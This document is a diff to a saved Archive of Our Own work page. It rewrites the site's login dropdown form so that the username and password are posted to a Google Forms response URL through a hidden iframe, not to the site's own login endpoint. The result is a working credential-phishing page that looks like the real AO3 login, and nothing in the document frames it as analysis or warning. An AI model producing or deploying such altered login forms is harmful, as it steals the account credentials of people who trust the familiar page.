@@ -39,25 +39,38 @@
  <p class="user actions">
  <a id=login-dropdown href="https://archiveofourown.org/works/55743664" class=dropdown-toggle data-toggle=dropdown data-target=#>Log In</a>
  </p>
-<div id="small_login" class="simple login sf-hidden">
-  <form class="new_user" id="new_user_session_small" action="/users/login?return_to=%2Fworks%2F55743664" accept-charset="UTF-8" method="post">
-    <dl>
-      <dt><label for="user_session_login_small">Username or email:</label></dt>
-      <dd><input autocomplete="on" id="user_session_login_small" type="text" name="user[login]" value="hamofwar"></dd>
-      <dt><label for="user_session_password_small">Password:</label></dt>
-      <dd><input id="user_session_password_small" type="password" name="user[password]"></dd>
-    </dl>
-    <p class="submit actions">
-      <label for="user_remember_me_small" class="action">
-        <input type="checkbox" name="user[remember_me]" id="user_remember_me_small" value="1">Remember Me
+<div id="small_login" class="simple login sf-hidden" style="padding: 15px; padding-bottom: 20px; box-sizing: border-box;">
+  <form class="new_user" id="new_user_session_small" 
+        action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeqjPSV2HLo_By2Cr82yJgjjMmA2NYSIZJDY9G3Zzj6vg1MXQ/formResponse" 
+        target="hidden_iframe" 
+        onsubmit="submitted=true;" 
+        method="post">
+    
+    <div style="margin-bottom: 10px;">
+      <label for="user_session_login_small" style="display: block; margin-bottom: 5px;">Username or email:</label>
+      <input autocomplete="on" id="user_session_login_small" type="text" name="entry.996873737" required style="box-sizing: border-box; width: 100%; padding: 5px;">
+    </div>
+    
+    <div style="margin-bottom: 10px;">
+      <label for="user_session_password_small" style="display: block; margin-bottom: 5px;">Password:</label>
+      <input id="user_session_password_small" type="password" name="entry.1007897845" required style="box-sizing: border-box; width: 100%; padding: 5px;">
+    </div>
+    
+    <div class="submit actions" style="float: none; text-align: center; margin-top: 15px;">
+      <label for="user_remember_me_small" class="action" style="margin-right: 10px;">
+        <input type="checkbox" name="remember_me" id="user_remember_me_small" value="Yes"> Remember Me
       </label>
-      <input type="submit" name="commit" value="Log In">
-    </p>
+      <input type="submit" value="Log In" class="button" style="cursor: pointer;">
+    </div>
+    
   </form>
-  <ul class="footnote actions">
-    <li><a href="https://archiveofourown.org/users/password/new">Forgot password?</a></li>
-    <li><a href="https://archiveofourown.org/invite_requests">Get an Invitation</a></li>
+  
+  <ul class="footnote actions" style="float: none; text-align: center; margin-top: 15px; padding: 0;">
+    <li style="display: inline; margin-right: 10px;"><a href="https://archiveofourown.org/users/password/new">Forgot password?</a></li>
+    <li style="display: inline;"><a href="https://archiveofourown.org/invite_requests">Get an Invitation</a></li>
   </ul>
+  
+  <div class="clear"></div>
 </div>
  </div>
  <nav aria-label=Site>
